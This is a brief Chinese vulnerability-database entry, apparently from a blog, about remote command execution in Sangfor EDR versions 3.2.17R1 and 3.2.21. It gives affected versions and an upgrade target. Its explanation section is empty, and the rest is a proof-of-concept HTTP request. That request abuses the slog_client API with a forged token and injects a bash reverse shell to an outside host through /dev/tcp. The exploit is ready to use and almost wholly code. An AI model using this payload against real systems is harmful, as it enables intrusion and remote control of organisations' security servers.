---
title: '深信服EDR 远程命令执行-2020-hvv2'
date: Sat, 12 Sep 2020 02:19:51 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 影响范围

受影响版本为3.2.17R1, 3.2.21两个版本，如果为这两个版本建议升级版本至 3.2.21.375

#### 漏洞原理

 

 POC

```html
POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
Host: xx.x.x.x
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.22.0
Content-Length: 77

{"params": "w=123\"'1234123'\"|bash -i >& /dev/tcp/ip/port 0>&1"} 
```

